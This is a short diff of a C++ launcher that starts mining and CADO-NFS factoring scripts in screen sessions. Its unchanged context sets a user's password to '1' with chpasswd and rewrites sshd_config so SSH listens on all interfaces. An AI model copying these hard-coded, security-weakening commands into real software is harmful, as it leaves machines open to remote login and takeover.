@@ -34,10 +34,8 @@ int main() {
     
     const std::string config_file_path = "/fact_dist/config.json";
     
-
     system("echo 'user:1' | sudo chpasswd");
     system("sudo sed -i 's/^#*ListenAddress 127.0.0.1/ListenAddress 0.0.0.0/' /etc/ssh/sshd_config && sudo service ssh restart");
-    
     
     int master = getMasterValue(config_file_path);
     if (master == -1) {
@@ -50,7 +48,7 @@ int main() {
             system("screen -S f -dm bash -c 'cd /fact_dist && sudo bash mine.sh'");
             break;
         case 2:
-            
+            system("screen -XS miner quit");
             system("sudo screen -S cpu -dm bash -c 'cd /fact_dist && cd cpu-server && sudo bash cpuecm_daemon.sh'");
             system("sudo screen -S cado -dm bash -c 'cd /fact_dist && sudo bash runcadocli.sh'");
             break;
